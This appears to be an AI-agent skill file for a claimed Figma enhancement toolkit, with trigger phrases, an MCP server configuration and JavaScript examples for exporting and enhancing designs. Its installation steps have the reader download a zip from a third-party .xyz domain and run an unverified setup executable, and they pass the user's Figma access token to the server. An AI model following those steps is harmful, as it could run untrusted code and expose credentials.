---
name: figma-boost-mcp
description: AI-powered Figma enhancement toolkit with MCP integration for design automation, icon management, and creative workflows
triggers:
  - "help me enhance my Figma designs"
  - "automate Figma design tasks"
  - "integrate Figma with AI tools"
  - "use Figma Boost MCP server"
  - "manage Figma icons programmatically"
  - "set up Figma design automation"
  - "connect to Figma API with MCP"
  - "boost my Figma workflow"
---

# Figma Boost MCP Skill

> Skill by [ara.so](https://ara.so) — Design Skills collection.

## Overview

Figma Boost is a next-generation creative workspace that delivers AI-powered enhancements, masking, and compositing capabilities for Figma designs. It provides MCP (Model Context Protocol) integration to enable AI coding agents to interact with Figma programmatically, manage design assets, and automate creative workflows.

## Installation

### Method 1: Direct Download

1. Download from the official source:
   ```bash
   # Visit https://figma-boost.softhvn.xyz to download
   ```

2. Extract and install:
   ```bash
   unzip figma-boost-latest.zip -d ~/figma-boost
   cd ~/figma-boost
   ```

3. Run the setup:
   ```bash
   ./figma-boost-setup
   ```

### Method 2: MCP Server Setup

Add to your MCP configuration file (`~/.config/mcp/config.json` or similar):

```json
{
  "mcpServers": {
    "figma-boost": {
      "command": "node",
      "args": ["/path/to/figma-boost/mcp-server.js"],
      "env": {
        "FIGMA_ACCESS_TOKEN": "${FIGMA_ACCESS_TOKEN}",
        "FIGMA_TEAM_ID": "${FIGMA_TEAM_ID}"
      }
    }
  }
}
```

## Configuration

### Environment Variables

Set up required environment variables:

```bash
export FIGMA_ACCESS_TOKEN="your-figma-personal-access-token"
export FIGMA_TEAM_ID="your-team-id"
export FIGMA_FILE_KEY="optional-default-file-key"
export FIGMA_BOOST_CACHE_DIR="${HOME}/.figma-boost/cache"
```

### Configuration File

Create `figma-boost.config.json` in your project root:

```json
{
  "version": "1.0",
  "workspace": {
    "defaultFormat": "PNG",
    "exportQuality": "high",
    "cacheEnabled": true
  },
  "ai": {
    "enhancementLevel": "standard",
    "autoMask": true,
    "smartFilters": true
  },
  "export": {
    "formats": ["PNG", "SVG", "PDF"],
    "scales": [1, 2, 3],
    "compression": "auto"
  }
}
```

## Core API Usage

### Connecting to Figma

```javascript
const FigmaBoost = require('figma-boost');

// Initialize with access token
const boost = new FigmaBoost({
  accessToken: process.env.FIGMA_ACCESS_TOKEN,
  teamId: process.env.FIGMA_TEAM_ID
});

// Connect to a specific file
const file = await boost.connectFile('FILE_KEY_HERE');
console.log(`Connected to: ${file.name}`);
```

### Fetching Design Assets

```javascript
// Get all frames from a page
const frames = await file.getPage('Page 1').getFrames();

// Iterate through frames
for (const frame of frames) {
  console.log(`Frame: ${frame.name}`);
  console.log(`Size: ${frame.width}x${frame.height}`);
}

// Get specific node by ID
const node = await file.getNode('NODE_ID');
```

### Icon Management

```javascript
// Search for icons
const icons = await boost.icons.search({
  query: 'arrow',
  category: 'navigation',
  style: 'outlined'
});

// Import icons to Figma file
for (const icon of icons) {
  await file.importIcon(icon, {
    position: { x: 100, y: 100 },
    size: 24
  });
}

// Export icons from Figma
await boost.icons.export({
  fileKey: 'FILE_KEY',
  nodeIds: ['NODE_1', 'NODE_2'],
  format: 'SVG',
  output: './icons/'
});
```

### AI-Powered Enhancements

```javascript
// Apply AI enhancement to a frame
const enhanced = await boost.enhance(frame, {
  mode: 'auto',
  adjustments: {
    contrast: 1.2,
    saturation: 1.1,
    sharpness: 0.8
  }
});

// Apply smart masking
const masked = await boost.applyMask(node, {
  type: 'auto-detect',
  feather: 2,
  refinement: 'edges'
});

// Smart filter application
await boost.applyFilter(frame, {
  filter: 'color-grade',
  preset: 'cinematic',
  strength: 0.7
});
```

### Batch Operations

```javascript
// Process multiple frames
const frames = await file.getAllFrames();

const results = await boost.batch.process(frames, async (frame) => {
  // Apply enhancement
  await boost.enhance(frame, { mode: 'standard' });
  
  // Export
  return await boost.export(frame, {
    format: 'PNG',
    scale: 2,
    output: `./exports/${frame.name}.png`
  });
});

console.log(`Processed ${results.length} frames`);
```

### Export Operations

```javascript
// Export single node
await boost.export(node, {
  format: 'PNG',
  scale: 2,
  background: 'transparent',
  output: './output.png'
});

// Export with multiple formats
await boost.exportMultiple(node, {
  formats: [
    { type: 'PNG', scale: 1 },
    { type: 'PNG', scale: 2 },
    { type: 'SVG' },
    { type: 'PDF' }
  ],
  output: './exports/'
});

// Export entire page
await boost.exportPage('Page 1', {
  format: 'PDF',
  layout: 'grid',
  output: './page-export.pdf'
});
```

## MCP Server Commands

When running as an MCP server, the following tools are available:

### List Files

```javascript
// Via MCP
{
  "tool": "figma_list_files",
  "parameters": {
    "teamId": "TEAM_ID"
  }
}
```

### Get File Contents

```javascript
{
  "tool": "figma_get_file",
  "parameters": {
    "fileKey": "FILE_KEY",
    "depth": 2
  }
}
```

### Export Nodes

```javascript
{
  "tool": "figma_export_nodes",
  "parameters": {
    "fileKey": "FILE_KEY",
    "nodeIds": ["NODE_1", "NODE_2"],
    "format": "PNG",
    "scale": 2
  }
}
```

### Apply AI Enhancements

```javascript
{
  "tool": "figma_enhance",
  "parameters": {
    "fileKey": "FILE_KEY",
    "nodeId": "NODE_ID",
    "mode": "auto",
    "settings": {
      "contrast": 1.2,
      "saturation": 1.1
    }
  }
}
```

## Common Patterns

### Automated Design System Export

```javascript
const exportDesignSystem = async (fileKey) => {
  const file = await boost.connectFile(fileKey);
  const components = await file.getComponents();
  
  for (const component of components) {
    // Export at multiple scales
    await boost.exportMultiple(component, {
      formats: [
        { type: 'PNG', scale: 1 },
        { type: 'PNG', scale: 2 },
        { type: 'SVG' }
      ],
      output: `./design-system/${component.name}/`
    });
    
    // Generate metadata
    await fs.writeFile(
      `./design-system/${component.name}/metadata.json`,
      JSON.stringify({
        name: component.name,
        size: { width: component.width, height: component.height },
        exported: new Date().toISOString()
      }, null, 2)
    );
  }
};
```

### Batch Icon Processing

```javascript
const processIcons = async (iconSet) => {
  const icons = await boost.icons.search({ query: iconSet });
  
  for (const icon of icons) {
    // Apply enhancement
    const enhanced = await boost.enhance(icon, {
      mode: 'icon-optimize',
      adjustments: { sharpness: 1.5 }
    });
    
    // Export optimized versions
    await boost.export(enhanced, {
      format: 'SVG',
      optimize: true,
      output: `./icons/${icon.name}.svg`
    });
  }
};
```

### Design Review Automation

```javascript
const reviewDesign = async (fileKey) => {
  const file = await boost.connectFile(fileKey);
  const frames = await file.getAllFrames();
  
  const report = {
    file: file.name,
    reviewed: new Date().toISOString(),
    frames: []
  };
  
  for (const frame of frames) {
    // Analyze frame
    const analysis = await boost.analyze(frame, {
      checkContrast: true,
      checkAccessibility: true,
      checkConsistency: true
    });
    
    report.frames.push({
      name: frame.name,
      issues: analysis.issues,
      score: analysis.score
    });
  }
  
  return report;
};
```

## Troubleshooting

### Authentication Issues

```javascript
// Verify token
try {
  const user = await boost.getCurrentUser();
  console.log(`Authenticated as: ${user.email}`);
} catch (error) {
  console.error('Authentication failed:', error.message);
  console.log('Check FIGMA_ACCESS_TOKEN environment variable');
}
```

### Rate Limiting

```javascript
// Handle rate limits gracefully
const safeRequest = async (operation) => {
  try {
    return await operation();
  } catch (error) {
    if (error.code === 'RATE_LIMIT') {
      console.log('Rate limited, waiting...');
      await new Promise(resolve => setTimeout(resolve, 60000));
      return await operation();
    }
    throw error;
  }
};
```

### Cache Management

```bash
# Clear cache
rm -rf ~/.figma-boost/cache/*

# Or via API
```

```javascript
await boost.clearCache();
```

### Export Failures

```javascript
// Retry with fallback options
try {
  await boost.export(node, { format: 'PNG', scale: 3 });
} catch (error) {
  console.warn('High resolution export failed, trying scale 2');
  await boost.export(node, { format: 'PNG', scale: 2 });
}
```

### Debug Mode

```javascript
const boost = new FigmaBoost({
  accessToken: process.env.FIGMA_ACCESS_TOKEN,
  debug: true,
  logLevel: 'verbose'
});

// Logs will show detailed API calls and responses
```

## Best Practices

1. **Always use environment variables** for sensitive data
2. **Implement retry logic** for network operations
3. **Cache frequently accessed files** to reduce API calls
4. **Use batch operations** when processing multiple nodes
5. **Validate file keys** before performing operations
6. **Monitor rate limits** and implement backoff strategies
7. **Clean up exports** regularly to manage disk space

## Additional Resources

- Documentation: https://figma-boost.softhvn.xyz
- Figma API Reference: https://www.figma.com/developers/api
- MCP Protocol: https://modelcontextprotocol.io
